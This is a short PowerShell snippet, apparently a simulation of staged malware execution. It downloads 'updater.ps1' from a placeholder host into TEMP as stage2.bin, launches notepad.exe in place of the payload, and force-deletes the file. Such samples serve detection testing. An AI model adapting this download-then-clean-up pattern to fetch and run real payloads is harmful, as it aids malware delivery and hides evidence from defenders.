
<# Staged execution #> $Stage2Url = 'https://contoso.com/updater.ps1'; $WorkingPath = "$env:TEMP\stage2.bin"; (New-Object System.Net.WebClient).DownloadFile($Stage2Url, $WorkingPath); & "notepad.exe"; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
